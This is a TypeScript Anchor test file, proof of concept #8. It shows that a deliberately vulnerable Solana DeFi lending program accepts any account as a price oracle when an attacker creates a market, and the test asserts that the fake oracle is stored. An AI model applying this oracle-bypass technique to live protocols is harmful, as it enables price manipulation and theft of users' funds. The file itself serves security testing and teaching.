import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { createMint, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";
import { assert } from "chai";

// POC #8: AccountInfo Oracle Bypass

describe("POC #8 - AccountInfo Oracle Bypass", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let supplyMint: anchor.web3.PublicKey;
  let collateralMint: anchor.web3.PublicKey;
  let configKeypair: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }

    supplyMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);
    collateralMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);

    // Initialize config
    configKeypair = anchor.web3.Keypair.generate();
    await program.methods
      .initialize(admin.publicKey)
      .accounts({
        config: configKeypair.publicKey,
        signer: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin, configKeypair])
      .rpc();
  });

  it("Attacker supplies fake oracle (any account) during market creation", async () => {
    const marketId = new anchor.BN(2);
    const fakeOracle = anchor.web3.Keypair.generate();

    const [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("market"), marketId.toArrayLike(Buffer, "le", 8), supplyMint.toBuffer(), collateralMint.toBuffer()],
      program.programId
    );

    const vaultAccount = await getOrCreateAssociatedTokenAccount(provider.connection, attacker, supplyMint, marketPDA, true);
    const vault = vaultAccount.address;

    await program.methods
      .createMarket(marketId)
      .accounts({
        market: marketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: fakeOracle.publicKey,
        collateralOracle: fakeOracle.publicKey,
        vault,
        authority: attacker.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker])
      .rpc();

    const marketData = await program.account.market.fetch(marketPDA);
    assert.equal(marketData.supplyOracle.toString(), fakeOracle.publicKey.toString());
  });
});
